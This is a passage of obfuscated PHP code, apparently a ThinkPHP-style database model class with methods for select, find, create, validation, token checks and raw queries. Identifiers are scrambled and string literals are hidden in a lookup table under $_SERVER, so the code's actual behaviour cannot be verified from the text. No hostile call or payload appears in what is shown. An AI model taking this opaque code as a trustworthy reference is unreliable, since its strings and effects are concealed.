(!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $–ÕÇ‰¾© = $this->getPk(); if (is_numeric($§öãèÑ) || is_string($§öãèÑ)) { if (strpos($§öãèÑ, $ÍÀØ´é¡[50])) { $²¶ŠÚÙ‚[$–ÕÇ‰¾©] = array($ÍÀØ´é¡[285], $§öãèÑ); } else { $²¶ŠÚÙ‚[$–ÕÇ‰¾©] = $§öãèÑ; } $this->options[$ÍÀØ´é¡[284]] = $²¶ŠÚÙ‚; } $§öãèÑ = $this->_parseOptions(); if (is_array($§öãèÑ[$ÍÀØ´é¡[284]]) && isset($§öãèÑ[$ÍÀØ´é¡[284]][$–ÕÇ‰¾©])) { $‡¶ß—š = $§öãèÑ[$ÍÀØ´é¡[284]][$–ÕÇ‰¾©]; } $ØÔ¥ìÓÓ = $this->db->delete($§öãèÑ); if (!1 !== $ØÔ¥ìÓÓ) { $â­¨Ïãí = array(); if (isset($‡¶ß—š)) { $â­¨Ïãí[$–ÕÇ‰¾©] = $‡¶ß—š; } $this->_after_delete($â­¨Ïãí, $§öãèÑ); } return $ØÔ¥ìÓÓ; } protected function _after_delete($ã¼ÒİÂõ, $ÜŒıÊî¡) { } public function select($šş¿¶È = array()) { $ĞâêèºÃ =& $_SERVER[ĞÆÏ¡Îª]; if (is_string($šş¿¶È) || is_numeric($šş¿¶È)) { $—ãº®•• = $this->getPk(); if (strpos($šş¿¶È, $ĞâêèºÃ[50])) { $˜í•™Ä[$—ãº®••] = array($ĞâêèºÃ[285], $šş¿¶È); } else { $˜í•™Ä[$—ãº®••] = $šş¿¶È; } $this->options[$ĞâêèºÃ[284]] = $˜í•™Ä; } elseif (!1 === $šş¿¶È) { $šş¿¶È = $this->_parseOptions(); return $ĞâêèºÃ[286] . $this->db->buildSelectSql($šş¿¶È) . $ĞâêèºÃ[287]; } $šş¿¶È = $this->_parseOptions(); $—ûøæó– = $this->db->select($šş¿¶È); if (!1 === $—ûøæó–) { return !1; } if (empty($—ûøæó–)) { return null; } $this->_afterSelect($—ûøæó–, $šş¿¶È); return $—ûøæó–; } protected function _afterSelect(&$¹ê»÷Óè, $µ¹È™Ÿ) { } public function buildSql($ÏñôèŒ— = array()) { $áÈÉ½æƒ =& $_SERVER[ĞÆÏ¡Îª]; $ÏñôèŒ— = $this->_parseOptions($ÏñôèŒ—); return $áÈÉ½æƒ[286] . $this->db->buildSelectSql($ÏñôèŒ—) . $áÈÉ½æƒ[287]; } public function optionsValue($úß¶÷ˆÄ = null) { if (is_null($úß¶÷ˆÄ)) { return $this->options; } elseif (is_array($úß¶÷ˆÄ)) { $this->options = array_merge($this->options, $úß¶÷ˆÄ); } } protected function _parseOptions($»â¡ŒĞÏ = array()) { $ÇìšÃŸ´ =& $_SERVER[ĞÆÏ¡Îª]; if (is_array($»â¡ŒĞÏ)) { $»â¡ŒĞÏ = array_merge($this->options, $»â¡ŒĞÏ); } $this->options = array(); if (!isset($»â¡ŒĞÏ[$ÇìšÃŸ´[288]])) { $»â¡ŒĞÏ[$ÇìšÃŸ´[288]] = $this->getTableName(); $¶˜¾ÚÌ´ = $this->fields; } else { $¶˜¾ÚÌ´ = $this->getDbFields(); } if (!empty($»â¡ŒĞÏ[$ÇìšÃŸ´[289]])) { $»â¡ŒĞÏ[$ÇìšÃŸ´[288]] .= $ÇìšÃŸ´[53] . $»â¡ŒĞÏ[$ÇìšÃŸ´[289]]; } $»â¡ŒĞÏ[$ÇìšÃŸ´[290]] = $this->name; if (isset($»â¡ŒĞÏ[$ÇìšÃŸ´[284]]) && is_array($»â¡ŒĞÏ[$ÇìšÃŸ´[284]]) && !empty($¶˜¾ÚÌ´) && !isset($»â¡ŒĞÏ[$ÇìšÃŸ´[291]]) && !isset($»â¡ŒĞÏ[$ÇìšÃŸ´[288]])) { foreach ($»â¡ŒĞÏ[$ÇìšÃŸ´[284]] as $ÏÅœËïÛ => $ÓÒÑÀÁ©) { $ÏÅœËïÛ = trim($ÏÅœËïÛ); if (in_array($ÏÅœËïÛ, $¶˜¾ÚÌ´, !0)) { if (is_scalar($ÓÒÑÀÁ©)) { $this->_parseType($»â¡ŒĞÏ[$ÇìšÃŸ´[284]], $ÏÅœËïÛ); } } elseif (!is_numeric($ÏÅœËïÛ) && $ÇìšÃŸ´[11] != substr($ÏÅœËïÛ, 0, 1) && !1 === strpos($ÏÅœËïÛ, $ÇìšÃŸ´[10]) && !1 === strpos($ÏÅœËïÛ, $ÇìšÃŸ´[269]) && !1 === strpos($ÏÅœËïÛ, $ÇìšÃŸ´[292]) && !1 === strpos($ÏÅœËïÛ, $ÇìšÃŸ´[293])) { unset($»â¡ŒĞÏ[$ÇìšÃŸ´[284]][$ÏÅœËïÛ]); } } } $this->_options_filter($»â¡ŒĞÏ); return $»â¡ŒĞÏ; } protected function _options_filter(&$ıåóßÇ¡) { } protected function _parseType(&$æÚé²ê¯, $ç“¸ÒşÍ) { $‘íšæÅ› =& $_SERVER[ĞÆÏ¡Îª]; if (empty($this->options[$‘íšæÅ›[294]][$‘íšæÅ›[4] . $ç“¸ÒşÍ])) { $áÜùÓğå = strtolower($this->fields[$‘íšæÅ›[261]][$ç“¸ÒşÍ]); if (!1 !== strpos($áÜùÓğå, $‘íšæÅ›[295])) { } elseif (!1 === strpos($áÜùÓğå, $‘íšæÅ›[296]) && !1 !== strpos($áÜùÓğå, $‘íšæÅ›[297])) { $æÚé²ê¯[$ç“¸ÒşÍ] = intval($æÚé²ê¯[$ç“¸ÒşÍ]); } elseif (!1 !== strpos($áÜùÓğå, $‘íšæÅ›[298]) || !1 !== strpos($áÜùÓğå, $‘íšæÅ›[299])) { $æÚé²ê¯[$ç“¸ÒşÍ] = floatval($æÚé²ê¯[$ç“¸ÒşÍ]); } elseif (!1 !== strpos($áÜùÓğå, $‘íšæÅ›[300])) { $æÚé²ê¯[$ç“¸ÒşÍ] = (bool) $æÚé²ê¯[$ç“¸ÒşÍ]; } } } public function find($»û»‚Áµ = array()) { $ñÖĞ”×ä =& $_SERVER[ĞÆÏ¡Îª]; if (is_numeric($»û»‚Áµ) || is_string($»û»‚Áµ)) { $™åŠœã—[$this->getPk()] = intval($»û»‚Áµ); $this->options[$ñÖĞ”×ä[284]] = $™åŠœã—; } $this->options[$ñÖĞ”×ä[301]] = 1; $»û»‚Áµ = $this->_parseOptions(); $îÄ„ŸÛš = $this->db->select($»û»‚Áµ); if (!1 === $îÄ„ŸÛš) { return !1; } if (empty($îÄ„ŸÛš)) { return null; } $this->data = $îÄ„ŸÛš[0]; $this->_afterFind($this->data, $»û»‚Áµ); if (!empty($this->options[$ñÖĞ”×ä[302]])) { return $this->returnResult($this->data, $this->options[$ñÖĞ”×ä[302]]); } return $this->data; } protected function _afterFind(&$Üïşï±Ñ, $¤âƒ Õé) { } protected function returnResult($±ßñ•Õ, $…µ¬™ìé = '') { $ ¤€ÊÛ¼ =& $_SERVER[ĞÆÏ¡Îª]; if ($…µ¬™ìé) { if (is_callable($…µ¬™ìé)) { return call_user_func($…µ¬™ìé, $±ßñ•Õ); } switch (strtolower($…µ¬™ìé)) { case $ ¤€ÊÛ¼[303]: return json_encode($±ßñ•Õ); case $ ¤€ÊÛ¼[304]: return xml_encode($±ßñ•Õ); } } return $±ßñ•Õ; } public function parseFieldsMap($é£ä¸Æ”, $Œ–½ˆ¶“ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $µİŸè»ç => $ôŒÚƒØ) { if ($Œ–½ˆ¶“ == 1) { if (isset($é£ä¸Æ”[$ôŒÚƒØ])) { $é£ä¸Æ”[$µİŸè»ç] = $é£ä¸Æ”[$ôŒÚƒØ]; unset($é£ä¸Æ”[$ôŒÚƒØ]); } } else { if (isset($é£ä¸Æ”[$µİŸè»ç])) { $é£ä¸Æ”[$ôŒÚƒØ] = $é£ä¸Æ”[$µİŸè»ç]; unset($é£ä¸Æ”[$µİŸè»ç]); } } } } return $é£ä¸Æ”; } public function setField($˜æÀûÌì, $’‹‘Ñö° = '') { if (is_array($˜æÀûÌì)) { $Ğñ£µí = $˜æÀûÌì; } else { $Ğñ£µí[$˜æÀûÌì] = $’‹‘Ñö°; } return $this->save($Ğñ£µí); } public function setAdd($€Œ»š×ô, $³Ñù›ü“ = 1) { $€ ˆ÷í =& $_SERVER[ĞÆÏ¡Îª]; $üì»¾Ë– = $€Œ»š×ô . $€ ˆ÷í[305] . $³Ñù›ü“; if ($³Ñù›ü“ < 0) { $üì»¾Ë– = $€Œ»š×ô . $³Ñù›ü“; } return $this->setField($€Œ»š×ô, array($€ ˆ÷í[306], $üì»¾Ë–)); } public function getField($²è›Ì¶á, $‰¼îÉŒ¢ = null) { $±å–·ÚŸ =& $_SERVER[ĞÆÏ¡Îª]; $ªä©Ç‚½[$±å–·ÚŸ[282]] = $²è›Ì¶á; $ªä©Ç‚½ = $this->_parseOptions($ªä©Ç‚½); $²è›Ì¶á = trim($²è›Ì¶á); if (strpos($²è›Ì¶á, $±å–·ÚŸ[50])) { if (!isset($ªä©Ç‚½[$±å–·ÚŸ[301]])) { $ªä©Ç‚½[$±å–·ÚŸ[301]] = is_numeric($‰¼îÉŒ¢) ? $‰¼îÉŒ¢ : $±å–·ÚŸ[12]; } $‘®‡›œˆ = $this->db->select($ªä©Ç‚½); if (!empty($‘®‡›œˆ)) { $…ŞÀÈê¿ = explode($±å–·ÚŸ[50], $²è›Ì¶á); $²è›Ì¶á = array_keys($‘®‡›œˆ[0]); $Ó³‘•…Ô = array_shift($²è›Ì¶á); $óÒø—É = array_shift($²è›Ì¶á); $¯§ŸÍÅî = array(); $³ˆØ­Ğ¦ = count($…ŞÀÈê¿); foreach ($‘®‡›œˆ as $â×‡ôµô) { $¥´ğÌŞè = $â×‡ôµô[$Ó³‘•…Ô]; if (2 == $³ˆØ­Ğ¦) { $¯§ŸÍÅî[$¥´ğÌŞè] = $â×‡ôµô[$óÒø—É]; } else { $¯§ŸÍÅî[$¥´ğÌŞè] = is_string($‰¼îÉŒ¢) ? implode($‰¼îÉŒ¢, $â×‡ôµô) : $â×‡ôµô; } } return $¯§ŸÍÅî; } } else { if (!0 !== $‰¼îÉŒ¢) { $ªä©Ç‚½[$±å–·ÚŸ[301]] = is_numeric($‰¼îÉŒ¢) ? $‰¼îÉŒ¢ : 1; } if ($‰¼îÉŒ¢ === $±å–·ÚŸ[264]) { unset($ªä©Ç‚½[$±å–·ÚŸ[301]]); } $â×‡ôµô = $this->db->select($ªä©Ç‚½); if (!empty($â×‡ôµô)) { if ($‰¼îÉŒ¢ === $±å–·ÚŸ[264]) { return reset($â×‡ôµô[0]); } if (!0 !== $‰¼îÉŒ¢ && 1 == $ªä©Ç‚½[$±å–·ÚŸ[301]]) { return reset($â×‡ôµô[0]); } foreach ($â×‡ôµô as $µ¥ø²ùÒ) { $ó—Ä˜Œß[] = $µ¥ø²ùÒ[$²è›Ì¶á]; } return $ó—Ä˜Œß; } } return null; } public function create($­¹øßº‚ = '', $îÅŸ…âç = '') { $¬Ãƒ›ú =& $_SERVER[ĞÆÏ¡Îª]; if (empty($­¹øßº‚)) { $­¹øßº‚ = $_POST; } elseif (is_object($­¹øßº‚)) { $­¹øßº‚ = get_object_vars($­¹øßº‚); } if (empty($­¹øßº‚) || !is_array($­¹øßº‚)) { $this->error = think_lang($¬Ãƒ›ú[280]); return !1; } $­¹øßº‚ = $this->parseFieldsMap($­¹øßº‚, 0); $îÅŸ…âç = $îÅŸ…âç ? $îÅŸ…âç : (!empty($­¹øßº‚[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¬Ãƒ›ú[282]])) { $Õß·Ü¦È = $this->options[$¬Ãƒ›ú[282]]; unset($this->options[$¬Ãƒ›ú[282]]); } elseif ($îÅŸ…âç == THINK_MODEL_INSERT && isset($this->insertFields)) { $Õß·Ü¦È = $this->insertFields; } elseif ($îÅŸ…âç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Õß·Ü¦È = $this->updateFields; } if (isset($Õß·Ü¦È)) { if (is_string($Õß·Ü¦È)) { $Õß·Ü¦È = explode($¬Ãƒ›ú[50], $Õß·Ü¦È); } if (think_config($¬Ãƒ›ú[307])) { $Õß·Ü¦È[] = think_config($¬Ãƒ›ú[308]); } foreach ($­¹øßº‚ as $¬Õ¼Õıñ => $®³ÃÈŒÆ) { if (!in_array($¬Õ¼Õıñ, $Õß·Ü¦È)) { unset($­¹øßº‚[$¬Õ¼Õıñ]); } } } if (!$this->autoValidation($­¹øßº‚, $îÅŸ…âç)) { return !1; } if (!$this->autoCheckToken($­¹øßº‚)) { $this->error = think_lang($¬Ãƒ›ú[309]); return !1; } if ($this->autoCheckFields) { $Õß·Ü¦È = $this->getDbFields(); foreach ($­¹øßº‚ as $¬Õ¼Õıñ => $®³ÃÈŒÆ) { if (!in_array($¬Õ¼Õıñ, $Õß·Ü¦È)) { unset($­¹øßº‚[$¬Õ¼Õıñ]); } elseif (MAGIC_QUOTES_GPC && is_string($®³ÃÈŒÆ)) { $­¹øßº‚[$¬Õ¼Õıñ] = stripslashes($®³ÃÈŒÆ); } } } $this->autoOperation($­¹øßº‚, $îÅŸ…âç); $this->data = $­¹øßº‚; return $­¹øßº‚; } public function autoCheckToken($¦ãˆÆñÔ) { $™ú©È¯© =& $_SERVER[ĞÆÏ¡Îª]; if (isset($this->options[$™ú©È¯©[310]]) && !$this->options[$™ú©È¯©[310]]) { return !0; } if (think_config($™ú©È¯©[307])) { $¡ÚàŞ¥Ì = think_config($™ú©È¯©[308]); if (!isset($¦ãˆÆñÔ[$¡ÚàŞ¥Ì]) || Session::get($¡ÚàŞ¥Ì)) { return !1; } list($ÓûéÏéù, $Èßèî–Û) = explode($™ú©È¯©[11], $¦ãˆÆñÔ[$¡ÚàŞ¥Ì]); if ($Èßèî–Û && Session::get($¡ÚàŞ¥Ì . $™ú©È¯©[10] . $ÓûéÏéù) === $Èßèî–Û) { Session::remove($¡ÚàŞ¥Ì . $™ú©È¯©[10] . $ÓûéÏéù); return !0; } if (think_config($™ú©È¯©[311])) { Session::remove($¡ÚàŞ¥Ì . $™ú©È¯©[10] . $ÓûéÏéù); } return !1; } return !0; } public function regex($‚¶ü¬şÃ, $…¸¡…”ë) { $òÁãÑ·Ã =& $_SERVER[ĞÆÏ¡Îª]; $˜¥œÚÑ  = array($òÁãÑ·Ã[312] => $òÁãÑ·Ã[313], $òÁãÑ·Ã[314] => $òÁãÑ·Ã[315], $òÁãÑ·Ã[316] => $òÁãÑ·Ã[317], $òÁãÑ·Ã[318] => $òÁãÑ·Ã[319], $òÁãÑ·Ã[320] => $òÁãÑ·Ã[321], $òÁãÑ·Ã[322] => $òÁãÑ·Ã[323], $òÁãÑ·Ã[324] => $òÁãÑ·Ã[325], $òÁãÑ·Ã[299] => $òÁãÑ·Ã[326], $òÁãÑ·Ã[327] => $òÁãÑ·Ã[328]); if (isset($˜¥œÚÑ [strtolower($…¸¡…”ë)])) { $…¸¡…”ë = $˜¥œÚÑ [strtolower($…¸¡…”ë)]; } return preg_match($…¸¡…”ë, $‚¶ü¬şÃ) === 1; } private function autoOperation(&$‰ã„È²Ï, $¾±àº¼») { $ëşªº½ =& $_SERVER[ĞÆÏ¡Îª]; if (!empty($this->options[$ëşªº½[329]])) { $±çÆÑ·š = $this->options[$ëşªº½[329]]; unset($this->options[$ëşªº½[329]]); } elseif (!empty($this->_auto)) { $±çÆÑ·š = $this->_auto; } if (isset($±çÆÑ·š)) { foreach ($±çÆÑ·š as $ê¸£·Çš) { if (empty($ê¸£·Çš[2])) { $ê¸£·Çš[2] = THINK_MODEL_INSERT; } if ($¾±àº¼» == $ê¸£·Çš[2] || $ê¸£·Çš[2] == THINK_MODEL_BOTH) { switch (trim($ê¸£·Çš[3])) { case $ëşªº½[330]: case $ëşªº½[331]: $ÃàÖåµÖ = isset($ê¸£·Çš[4]) ? (array) $ê¸£·Çš[4] : array(); if (isset($‰ã„È²Ï[$ê¸£·Çš[0]])) { array_unshift($ÃàÖåµÖ, $‰ã„È²Ï[$ê¸£·Çš[0]]); } if ($ëşªº½[330] == $ê¸£·Çš[3]) { $‰ã„È²Ï[$ê¸£·Çš[0]] = call_user_func_array($ê¸£·Çš[1], $ÃàÖåµÖ); } else { $‰ã„È²Ï[$ê¸£·Çš[0]] = call_user_func_array(array(&$this, $ê¸£·Çš[1]), $ÃàÖåµÖ); } break; case $ëşªº½[282]: $‰ã„È²Ï[$ê¸£·Çš[0]] = $‰ã„È²Ï[$ê¸£·Çš[1]]; break; case $ëşªº½[332]: if ($ëşªº½[12] === $‰ã„È²Ï[$ê¸£·Çš[0]]) { unset($‰ã„È²Ï[$ê¸£·Çš[0]]); } break; case $ëşªº½[333]: default: $‰ã„È²Ï[$ê¸£·Çš[0]] = $ê¸£·Çš[1]; } if (!1 === $‰ã„È²Ï[$ê¸£·Çš[0]]) { unset($‰ã„È²Ï[$ê¸£·Çš[0]]); } } } } return $‰ã„È²Ï; } protected function autoValidation($••œ¾¢¯, $ª’–ÔšÇ) { $í„°êÑ =& $_SERVER[ĞÆÏ¡Îª]; if (!empty($this->options[$í„°êÑ[334]])) { $­Öºæ¤ô = $this->options[$í„°êÑ[334]]; unset($this->options[$í„°êÑ[334]]); } elseif (!empty($this->_validate)) { $­Öºæ¤ô = $this->_validate; } if (isset($­Öºæ¤ô)) { if ($this->patchValidate) { $this->error = array(); } foreach ($­Öºæ¤ô as $Ü®ŒŒğß => $±ÂéÊû) { if (empty($±ÂéÊû[5]) || $±ÂéÊû[5] == THINK_MODEL_BOTH || $±ÂéÊû[5] == $ª’–ÔšÇ) { if (0 == strpos($±ÂéÊû[2], $í„°êÑ[335]) && strpos($±ÂéÊû[2], $í„°êÑ[336])) { $±ÂéÊû[2] = think_lang(substr($±ÂéÊû[2], 2, -1)); } $±ÂéÊû[3] = isset($±ÂéÊû[3]) ? $±ÂéÊû[3] : THINK_EXISTS_VALIDATE; $±ÂéÊû[4] = isset($±ÂéÊû[4]) ? $±ÂéÊû[4] : $í„°êÑ[337]; switch ($±ÂéÊû[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($••œ¾¢¯, $±ÂéÊû)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($í„°êÑ[12] != trim($••œ¾¢¯[$±ÂéÊû[0]])) { if (!1 === $this->_validationField($••œ¾¢¯, $±ÂéÊû)) { return !1; } } break; default: if (isset($••œ¾¢¯[$±ÂéÊû[0]])) { if (!1 === $this->_validationField($••œ¾¢¯, $±ÂéÊû)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÇèÂü„, $¹É’ÔÖÖ) { if (!1 === $this->_validationFieldItem($ÇèÂü„, $¹É’ÔÖÖ)) { if ($this->patchValidate) { $this->error[$¹É’ÔÖÖ[0]] = $¹É’ÔÖÖ[2]; } else { $this->error = $¹É’ÔÖÖ[2]; return !1; } } return; } protected function _validationFieldItem($Èä½³×˜, $‹ç¼»‰±) { $ğ™ƒ¤ùà =& $_SERVER[ĞÆÏ¡Îª]; switch (strtolower(trim($‹ç¼»‰±[4]))) { case $ğ™ƒ¤ùà[330]: case $ğ™ƒ¤ùà[331]: $½ñ¶š®» = isset($‹ç¼»‰±[6]) ? (array) $‹ç¼»‰±[6] : array(); if (is_string($‹ç¼»‰±[0]) && strpos($‹ç¼»‰±[0], $ğ™ƒ¤ùà[50])) { $‹ç¼»‰±[0] = explode($ğ™ƒ¤ùà[50], $‹ç¼»‰±[0]); } if (is_array($‹ç¼»‰±[0])) { foreach ($‹ç¼»‰±[0] as $ÕÜ»öªµ) { $ç¥¾“å“[$ÕÜ»öªµ] = $Èä½³×˜[$ÕÜ»öªµ]; } array_unshift($½ñ¶š®», $ç¥¾“å“); } else { array_unshift($½ñ¶š®», $Èä½³×˜[$‹ç¼»‰±[0]]); } if ($ğ™ƒ¤ùà[330] == $‹ç¼»‰±[4]) { return call_user_func_array($‹ç¼»‰±[1], $½ñ¶š®»); } else { return call_user_func_array(array(&$this, $‹ç¼»‰±[1]), $½ñ¶š®»); } case $ğ™ƒ¤ùà[338]: return $Èä½³×˜[$‹ç¼»‰±[0]] == $Èä½³×˜[$‹ç¼»‰±[1]]; case $ğ™ƒ¤ùà[339]: if (is_string($‹ç¼»‰±[0]) && strpos($‹ç¼»‰±[0], $ğ™ƒ¤ùà[50])) { $‹ç¼»‰±[0] = explode($ğ™ƒ¤ùà[50], $‹ç¼»‰±[0]); } $Ô•¢€ƒ = array(); if (is_array($‹ç¼»‰±[0])) { foreach ($‹ç¼»‰±[0] as $ÕÜ»öªµ) { $Ô•¢€ƒ[$ÕÜ»öªµ] = $Èä½³×˜[$ÕÜ»öªµ]; } } else { $Ô•¢€ƒ[$‹ç¼»‰±[0]] = $Èä½³×˜[$‹ç¼»‰±[0]]; } if (!empty($Èä½³×˜[$this->getPk()])) { $Ô•¢€ƒ[$this->getPk()] = array($ğ™ƒ¤ùà[340], $Èä½³×˜[$this->getPk()]); } if ($this->where($Ô•¢€ƒ)->find()) { return !1; } return !0; default: return $this->check($Èä½³×˜[$‹ç¼»‰±[0]], $‹ç¼»‰±[1], $‹ç¼»‰±[4]); } } public function check($Ïä©ıÅ‚, $ç€Ê”õĞ, $ËÖ§Æ¶ë = "\162\145\147\145\x78") { $ŠÜ£Úø =& $_SERVER[ĞÆÏ¡Îª]; $ËÖ§Æ¶ë = strtolower(trim($ËÖ§Æ¶ë)); switch ($ËÖ§Æ¶ë) { case $ŠÜ£Úø[7]: case $ŠÜ£Úø[341]: $·œÅ‘ÈÅ = is_array($ç€Ê”õĞ) ? $ç€Ê”õĞ : explode($ŠÜ£Úø[50], $ç€Ê”õĞ); return $ËÖ§Æ¶ë == $ŠÜ£Úø[7] ? in_array($Ïä©ıÅ‚, $·œÅ‘ÈÅ) : !in_array($Ïä©ıÅ‚, $·œÅ‘ÈÅ); case $ŠÜ£Úø[342]: case $ŠÜ£Úø[343]: if (is_array($ç€Ê”õĞ)) { $‰¦İöÙ÷ = $ç€Ê”õĞ[0]; $Ç¨ãÅï¨ = $ç€Ê”õĞ[1]; } else { list($‰¦İöÙ÷, $Ç¨ãÅï¨) = explode($ŠÜ£Úø[50], $ç€Ê”õĞ); } return $ËÖ§Æ¶ë == $ŠÜ£Úø[342] ? $Ïä©ıÅ‚ >= $‰¦İöÙ÷ && $Ïä©ıÅ‚ <= $Ç¨ãÅï¨ : $Ïä©ıÅ‚ < $‰¦İöÙ÷ || $Ïä©ıÅ‚ > $Ç¨ãÅï¨; case $ŠÜ£Úø[344]: case $ŠÜ£Úø[345]: return $ËÖ§Æ¶ë == $ŠÜ£Úø[344] ? $Ïä©ıÅ‚ == $ç€Ê”õĞ : $Ïä©ıÅ‚ != $ç€Ê”õĞ; case $ŠÜ£Úø[346]: $¥…Òü¼ = mb_strlen($Ïä©ıÅ‚, $ŠÜ£Úø[347]); if (strpos($ç€Ê”õĞ, $ŠÜ£Úø[50])) { list($‰¦İöÙ÷, $Ç¨ãÅï¨) = explode($ŠÜ£Úø[50], $ç€Ê”õĞ); return $¥…Òü¼ >= $‰¦İöÙ÷ && $¥…Òü¼ <= $Ç¨ãÅï¨; } else { return $¥…Òü¼ == $ç€Ê”õĞ; } case $ŠÜ£Úø[348]: list($‚ˆ‚«ƒ–, $ó¬ø§ˆş) = explode($ŠÜ£Úø[50], $ç€Ê”õĞ); if (!is_numeric($‚ˆ‚«ƒ–)) { $‚ˆ‚«ƒ– = strtotime($‚ˆ‚«ƒ–); } if (!is_numeric($ó¬ø§ˆş)) { $ó¬ø§ˆş = strtotime($ó¬ø§ˆş); } return NOW_TIME >= $‚ˆ‚«ƒ– && NOW_TIME <= $ó¬ø§ˆş; case $ŠÜ£Úø[349]: return in_array(get_client_ip(), explode($ŠÜ£Úø[50], $ç€Ê”õĞ)); case $ŠÜ£Úø[350]: return !in_array(get_client_ip(), explode($ŠÜ£Úø[50], $ç€Ê”õĞ)); case $ŠÜ£Úø[337]: default: return $this->regex($Ïä©ıÅ‚, $ç€Ê”õĞ); } } public function query($ÚÇø‚, $ö•ÂÅ = false) { $ÓÁÇÒò  =& $_SERVER[ĞÆÏ¡Îª]; if (!is_bool($ö•ÂÅ) && !is_array($ö•ÂÅ)) { $ö•ÂÅ = func_get_args(); array_shift($ö•ÂÅ); } $ÚÇø‚ = str_replace(array($ÓÁÇÒò [231], $ÓÁÇÒò [351]), $ÓÁÇÒò [53], $ÚÇø‚); $ÚÇø‚ = $this->parseSql($ÚÇø‚, $ö•ÂÅ); return $this->db->query($ÚÇø‚); } public function execute($ùßÛıãï, $†ŠØíÂƒ = false) { if (!is_bool($†ŠØíÂƒ) && !is_array($†ŠØíÂƒ)) { $†ŠØíÂƒ = func_get_args(); array_shift($†ŠØíÂƒ); } $ùßÛıãï = $this->parseSql($ùßÛıãï, $†ŠØíÂƒ); return $this->db->execute($ùßÛıãï); } protected function parseSql($›–Ğüú, $«Ù¥Ã´¢) { $èØœïÇô =& $_SERVER[ĞÆÏ¡Îª]; if (!0 === $«Ù¥Ã´¢) { $Ä½€ÂØ„ = $this->_parseOptions(); $›–Ğüú = $this->db->parseSql($›–Ğüú, $Ä½€ÂØ„); } elseif (is_array($«Ù¥Ã´¢)) { $«Ù¥Ã´¢ = array_map(array($this->db, $èØœïÇô[352]), $«Ù¥Ã´¢); $›–Ğüú = vsprintf($›–Ğüú, $«Ù¥Ã´¢); } else { $›–Ğüú = strtr($›–Ğüú, array($èØœïÇô[353] => $this->getTableName(), $èØœïÇô[354] => think_config($èØœïÇô[253]))); } $this->db->setModel($this->name); return $›–Ğüú; } public function db($ö‹ìÜ»£ = '', $é‹íî£ = '', $äáÓÌ“Ç = array()) { $š¬Ë›Ğ‰ =& $_SERVER[ĞÆÏ¡Îª]; if ($š¬Ë›Ğ‰[12] === $ö‹ìÜ»£ && $this->db) { return $this->db; } static $´«­°ÅÓ = array(); static $Àİ–Šèš = array(); if (!isset($Àİ–Šèš[$ö‹ìÜ»£]) || isset($Àİ–Šèš[$ö‹ìÜ»£]) && $é‹íî£ && $´«­°ÅÓ[$ö‹ìÜ»£] != $é‹íî£) { if (!empty($é‹íî£) && is_string($é‹íî£) && !1 === strpos($é‹íî£, $š¬Ë›Ğ‰[8])) { $é‹íî£ = think_config($é‹íî£); } $ö‹ìÜ»£ = think_guid($é‹íî£); $Àİ–Šèš[$ö‹ìÜ»£] = Db::getInstance($é‹íî£); } elseif (NULL === $é‹íî£) { $Àİ–Šèš[$ö‹ìÜ»£]->close(); unset($Àİ–Šèš[$ö‹ìÜ»£]); return; } if (!empty($äáÓÌ“Ç)) { if (is_string($äáÓÌ“Ç)) { parse_str($äáÓÌ“Ç, $äáÓÌ“Ç); } foreach ($äáÓÌ“Ç as $ÀşëüïĞ => $éÙ§æÏ˜) { $this->setProperty($ÀşëüïĞ, $éÙ§æÏ˜); } } $´«­°ÅÓ[$ö‹ìÜ»£] = $é‹íî£; $this->db = $Àİ–Šèš[$ö‹ìÜ»£]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ŸÊƒªÆü = get_class($this); if ($ŸÊƒªÆü == $_SERVER[ĞÆÏ¡Îª][355]) { return $this->name; } $this->name = substr($ŸÊƒªÆü, 0, -5); } return $this->name; } public function getTableName() { $ÅÔÉİÖ½ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($this->trueTableName)) { $ûà¤²¼Ó = !empty($this->tablePrefix) ? $this->tablePrefix : $ÅÔÉİÖ½[12]; if (!empty($this->tableName)) { $ûà¤²¼Ó .= $this->tableName; } else { $ûà¤²¼Ó .= think_parse_name($this->name); } $this->trueTableName = strtolower($ûà¤²¼Ó); } return (!empty($this->dbName) ? $this->dbName . $ÅÔÉİÖ½[10] : $ÅÔÉİÖ½[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $İò»îª =& $_SERVER[ĞÆÏ¡Îª]; return isset($this->fields[$İò»îª[260]]) ? $this->fields[$İò»îª[260]] : $this->pk; } public function getDbFields() { $ÕŠ¨•î¾ =& $_SERVER[ĞÆÏ¡Îª]; if (isset($this->options[$ÕŠ¨•î¾[288]])) { $ÚÀÅ½úİ = $this->db->getFields($this->options[$ÕŠ¨•î¾[288]]); return $ÚÀÅ½úİ ? array_keys($ÚÀÅ½úİ) : !1; } if ($this->fields) { $ÚÀÅ½úİ = $this->fields; unset($ÚÀÅ½úİ[$ÕŠ¨•î¾[259]], $ÚÀÅ½úİ[$ÕŠ¨•î¾[260]], $ÚÀÅ½úİ[$ÕŠ¨•î¾[261]], $ÚÀÅ½úİ[$ÕŠ¨•î¾[258]]); return $ÚÀÅ½úİ; } return !1; } public function data($‡®£‘ = '') { $éÄŞø“ =& $_SERVER[ĞÆÏ¡Îª]; if ($éÄŞø“[12] === $‡®£‘ && !empty($this->data)) { return $this->data; } if (is_object($‡®£‘)) { $‡®£‘ = get_object_vars($‡®£‘); } elseif (is_string($‡®£‘)) { parse_str($‡®£‘, $‡®£‘); } elseif (!is_array($‡®£‘)) { think_exception(think_lang($éÄŞø“[280])); } $this->data = $‡®£‘; return $this; } public function join($©Û‹ ¹¦) { $ñ×òİ½ç =& $_SERVER[ĞÆÏ¡Îª]; if (is_array($©Û‹ ¹¦)) { 